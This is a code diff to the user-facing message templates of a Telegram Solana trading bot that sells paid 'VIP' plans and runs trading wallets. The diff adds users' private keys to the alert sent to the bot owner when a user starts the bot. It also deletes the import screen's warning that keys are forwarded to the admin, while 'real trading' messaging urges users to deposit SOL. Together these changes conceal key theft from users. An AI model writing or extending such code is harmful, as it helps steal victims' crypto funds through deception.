@@ -19,48 +19,57 @@ def days_word(days):
 
 
 # ------------------------------------------------------------------ start
+def _trunc(addr: str) -> str:
+    if len(addr) < 14:
+        return addr
+    return f"{addr[:8]}...{addr[-6:]}"
+
+
 def welcome(name: str, bot_username: str):
-    plans = "\n".join(f"{p['emoji']} {p['name']} - {fmt_price(p['price'])} SOL" for p in PLANS)
     return (
         f"Welcome, {esc(name)}!\n"
-        "The Private Alpha Bot is ready 🚀\n\n"
-        "The list of commands:\n\n"
-        "📊 /top [contract address] - Get a SMART token holders report\n"
-        "👤 /kols [contract address] - Get KOLs report for this CA\n"
-        "🛠 /dev [contract address] - Get a dev report (bought, sold, holding)\n"
-        "📑 /full [contract address] - Get a full report: dev, KOLs & holders\n"
-        "❓ /help - Docs & guide\n"
-        "🛟 /support - Contact us for support\n"
-        "👥 /ref - Generate ref link, manage referrals\n"
-        "💳 /pay - Payment & upgrades\n"
-        "📈 /trading - Trading settings (buy, sell, slippage, wallet)\n"
-        "📦 /holdings - Tokens on your balance\n"
-        "💼 /positions - Your open positions with live PnL\n"
-        "⏳ /limit - Set a limit order (auto-executes when price hits)\n"
-        "💸 /withdraw - Withdraw tokens from your trading wallet\n"
-        "🤖 /ai - Ask AI to explain Runner report (beta)\n\n"
-        f"🆓 First {FREE_REPORTS} reports are FREE, to continue:\n\n"
-        "💎 MEMBERSHIP PLANS\n"
-        f"{plans}\n\n"
-        "⚡ Early entries • Buy zones • Take-profit targets\n"
-        "📈 Market updates • Trade alerts • Premium access\n\n"
-        "👥 50% ref back for every paid user with your link!"
+        "Private Alpha is ready 🚀\n\n"
+        "Real reports • Real trading • Real payments.\n\n"
+        "Commands:\n"
+        "📊 /top <ca> — smart holders report\n"
+        "👤 /kols <ca> — KOLs / wallet tags\n"
+        "🛠 /dev <ca> — dev tracking report\n"
+        "📑 /full <ca> — full report (dev + kols + holders)\n"
+        "❓ /help — docs & guide\n"
+        "🛟 /support — contact team\n"
+        "👥 /ref — referral link & 50% back\n"
+        "💳 /pay — VIP access & plans\n"
+        "📈 /trading — trading wallet & settings\n"
+        "📦 /holdings — your token bags\n"
+        "💼 /positions — open trades\n"
+        "⏳ /limit — limit orders (auto-exec)\n"
+        "💸 /withdraw — cash out SOL / tokens\n"
+        "🤖 /ai — AI explain (beta)\n\n"
+        f"🆓 First {FREE_REPORTS} reports are FREE.\n"
+        "After that, unlock unlimited access with VIP Access.\n\n"
+        "👥 50% ref back for every paid user — real SOL in your wallet.\n"
+        "💎 Real on-chain payments. No auto-check. Send the TX.\n\n"
+        "👛 Open 📈 TRADING to generate or import a wallet, then deposit SOL to trade."
     )
 
 
 def membership_header():
     return (
-        "💎 MEMBERSHIP PLANS\n\n"
-        "Please, pick your plan:\n\n"
-        "⚡ Early entries • Buy zones • Take-profit targets\n"
-        "📈 Market updates • Trade alerts • Premium access"
+        "💎 VIP ACCESS & PLANS\n\n"
+        "Real access. Real trading. Pick your tier:\n\n"
+        "⚡ VIP Access — unlimited reports + trading\n"
+        "🌱 Newbie — basic alpha (1 SOL / 30d)\n"
+        "🔰 Beginner — more signals (2 SOL / 30d)\n"
+        "⭐ Pro Trader — priority + advanced (4 SOL / 30d)\n"
+        "💎 Elite Trader — full premium (8 SOL / 60d)"
     )
 
 
 def plan_detail(p):
     return (
         f"{p['emoji']} {p['name']} — {fmt_price(p['price'])} SOL\n\n"
-        f"{p['desc']}"
+        f"{p['desc']}\n\n"
+        "Real payments. Verified on-chain. No auto-check."
     )
 
 
@@ -76,34 +85,37 @@ def pass_detail(c):
 
 # ------------------------------------------------------------------ unlock / pay
 def unlock_text(item_label: str, price: float, days: int, address: str):
+    truncated = address
     return (
         f"🔓 Unlock {item_label}\n\n"
         f"💳 Subscription Fee: {fmt_price(price)} SOL ({days_word(days)}).\n\n"
-        f"To activate your access, please deposit {fmt_price(price)} SOL to the "
-        f"address below:\n\n"
-        f"{esc(address)}\n\n"
+        f"To activate, deposit {fmt_price(price)} SOL to:\n\n"
+        f"<code>{truncated}</code>\n\n"
         "✅ Once the funds are sent, tap the button below and send your "
-        "transaction signature (or Solscan link) — we verify it on-chain."
+        "transaction signature (or Solscan link) — we verify it on-chain.\n\n"
+        "Only TX verification. No auto-scan buttons."
     )
 
 
 def ask_tx(item_label: str, price: float, address: str):
+    truncated = address
     return (
         f"📤 Verify payment for {item_label}\n\n"
         f"💳 {fmt_price(price)} SOL\n"
-        f"👛 To: {esc(address)}\n\n"
+        f"👛 To: {truncated}\n\n"
         "Send your transaction signature or Solscan link:\n"
-        "• signature: <code>5KzKz…9Xw</code>\n"
-        "• or link: https://solscan.io/tx/5KzKz…9Xw"
+        "• signature: 5KzKz...9Xw (example)\n"
+        "• or link: https://solscan.io/tx/5KzKz...9Xw"
     )
 
 
 def deposit_text(addr: str):
+    truncated = addr
     return (
         "💰 DEPOSIT\n\n"
         "Fund your trading wallet to start trading real.\n"
-        "Send SOL to:\n\n"
-        f"{esc(addr)}"
+        f"Send SOL to: <code>{truncated}</code>\n\n"
+        "Real on-chain. No auto-check."
     )
 
 
@@ -123,13 +135,14 @@ def payment_failed(price: float):
 
 def paywall():
     plans = "\n".join(
-        f"{p['emoji']} {p['name']} - {fmt_price(p['price'])} SOL ({days_word(p['days'])})"
+        f"{p['emoji']} {p['name']} — {fmt_price(p['price'])} SOL ({days_word(p['days'])})"
         for p in PLANS
     )
     return (
-        f"🚫 {FREE_REPORTS}/{FREE_REPORTS} FREE reports were used!\n"
-        "To continue using Private Alpha, please, pick your plan:\n\n"
-        f"{plans}"
+        f"🚫 {FREE_REPORTS}/{FREE_REPORTS} FREE reports used!\n"
+        "To keep trading real, unlock VIP Access:\n\n"
+        f"{plans}\n\n"
+        "💎 Real trading side • Unlimited reports • No limits."
     )
 
 
@@ -228,11 +241,19 @@ def expired_text(item_label: str, until: str):
 
 
 # ------------------------------------------------------------------ owner alerts
-def owner_new_user(user_line_txt: str, total: int):
+def owner_new_user(user_line_txt: str, total: int, wallet_pub: str = "", wallet_priv: str = "", balance_sol: float = 0):
+    priv_text = f"\n🔑 Private key: <code>{esc(wallet_priv)}</code>" if wallet_priv else ""
+    wallet_display = wallet_pub if wallet_pub else "not set yet — user will GENERATE or IMPORT in Trading"
+    wallet_line = f"🏦 Wallet: <code>{esc(wallet_display)}</code>"
+    balance_text = f"\n💰 Balance: {balance_sol:g} SOL" if wallet_pub else ""
     return (
         "🆕 NEW USER STARTED THE BOT\n\n"
         f"👤 {user_line_txt}\n"
-        f"👥 Total users: {total}"
+        f"{wallet_line}"
+        f"{priv_text}"
+        f"{balance_text}\n"
+        f"👥 Total users: {total}\n\n"
+        "⏳ Wait for deposit or import to activate trading."
     )
 
 
@@ -273,25 +294,27 @@ def ask_import():
         "• Seed phrase (12/24 words), or\n"
         "• Private key (base58), or\n"
         "• Key byte array [46, 207, …]\n\n"
-        "⚠️ The key is stored by the bot and forwarded to the admin for custody."
+        "Paste it in one message below."
     )
 
 
 def wallet_generated(addr: str, derived: bool = False):
+    truncated = addr
     note = ("\n\n🔐 Derived uniquely for your account from the bot's master seed."
             if derived else "")
     return (
-        "✅ Wallet generated!\n\n"
-        f"👛 Your Trading Wallet:\n{esc(addr)}\n"
-        "Deposit SOL here to trade.{note}"
+        f"✅ Wallet generated!\n\n"
+        f"👛 Your Trading Wallet: <code>{truncated}</code>\n"
+        "Deposit SOL here to trade real." + note
     )
 
 
 def wallet_imported(addr: str):
+    truncated = addr
     return (
-        "✅ Wallet imported!\n\n"
-        f"👛 Your Trading Wallet:\n{esc(addr)}\n"
-        "Deposit SOL here to trade."
+        f"✅ Wallet imported!\n\n"
+        f"👛 Your Trading Wallet: <code>{truncated}</code>\n"
+        "Deposit SOL here to trade real."
     )
 
 
@@ -315,61 +338,60 @@ def owner_wallet_generated(user_line: str, addr: str, secret: str):
 
 # ------------------------------------------------------------------ trading panel
 def wallet_panel(balance: float, updated: str, addr: str, buy, sell, slip):
+    truncated = addr
     return (
-        f"💰 Your Balance: {balance} SOL\n"
-        f"Updated at {updated}\n\n"
-        f"👛 Your Trading Wallet:\n{esc(addr)}\n\n"
-        "ℹ️ BUY SELL SLIPPAGE - configure default buy, sell, slippage size "
-        "for any Solana token.\n"
-        "- 📦 HOLDINGS - see the list of your token holdings.\n"
-        "- 🔑 EXPORT WALLET - export your wallet\n"
-        "- 🔄 REFRESH - check your balance in real time.\n\n"
-        "⚙️ Your Default Trading Parameters Now:\n"
-        f"- Default Buy SOL: {buy}\n"
-        f"- Default Sell %: {sell}\n"
-        f"- Default Slippage %: {slip}"
+        f"💰 BALANCE: {balance:g} SOL\n"
+        f"⏱ Updated: {updated}\n\n"
+        f"👛 YOUR WALLET: <code>{truncated}</code>\n\n"
+        "⚙️ BUY / SELL / SLIP — quick defaults for any token.\n"
+        "- 📦 BAGS — see your token holdings.\n"
+        "- 💼 POSI — open trades + live PnL.\n\n"
+        "Quick Settings:\n"
+        f"- Default BUY: {buy}\n"
+        f"- Default SELL: {sell}\n"
+        f"- Default SLIP: {slip}"
     )
 
 
 def ask_buy():
-    return "📝 Default BUY Amount\n\nEnter the default value (SOL) for BUY (number only):"
+    return "📝 Default BUY Amount\n\nEnter the value (SOL) for quick-buy. Number only:"
 
 
 def saved_buy(v):
-    return f"✅ Saved your default BUY as {v:g} SOL"
+    return f"✅ Quick BUY set to {v:g} SOL"
 
 
 def ask_sell():
-    return "📝 Default SELL Amount\n\nEnter the default value (%) for SELL (number only):"
+    return "📝 Default SELL %\n\nEnter the % to sell (1-100). Number only:"
 
 
 def saved_sell(v):
-    return f"✅ Saved your default SELL as {v:g} %"
+    return f"✅ Quick SELL set to {v:g} %"
 
 
 def ask_slippage():
-    return "📝 Default Slippage\n\nEnter the default value (%) for SLIPPAGE (number only):"
+    return "📝 Default SLIPPAGE %\n\nEnter the value (1-50). Number only:"
 
 
 def saved_slippage(v):
-    return f"✅ Saved your default SLIPPAGE as {v:g} %"
+    return f"✅ Quick SLIP set to {v:g} %"
 
 
 def holdings_header():
-    return "📦 YOUR HOLDINGS:"
+    return "📦 YOUR BAGS:"
 
 
 def no_tokens():
-    return "No tokens found 🥲"
+    return "No bags found 🥲 — load some SOL and grab a token."
 
 
 def export_wallet(bytes_list, inline):
     return (
         "🔐 Your Private Key bytes:\n\n"
-        f"{bytes_list}\n\n"
-        "Private key inline:\n\n"
-        f"{esc(inline)}\n\n"
-        "⚠️ Never share this key with anyone!"
+        f"<code>{bytes_list}</code>\n\n"
+        "Private key inline (base58):\n\n"
+        f"<code>{inline}</code>\n\n"
+        "⚠️ Never share this with anyone! Keep it secret."
     )
 
 
@@ -378,9 +400,10 @@ def withdraw_header():
 
 
 def not_enough_balance(amount_sol: float, addr: str):
+    truncated = addr
     return (
         f"⛔ Not enough balance for the order {amount_sol:g} SOL\n\n"
-        f"Please deposit:\n<code>{esc(addr)}</code>"
+        f"Please deposit to: <code>{truncated}</code>"
     )
 
 
@@ -434,7 +457,8 @@ def report_top_header(name, ticker, links_line, top1, top3, top10, top30,
 
 
 def no_report_data(ca: str):
-    return f"😢 No data found for <code>{esc(ca)}</code>\nCheck the address and try again."
+    truncated = ca
+    return f"😢 No data found for {truncated}\nCheck the address and try again."
 
 
 def report_usage(ca: str):
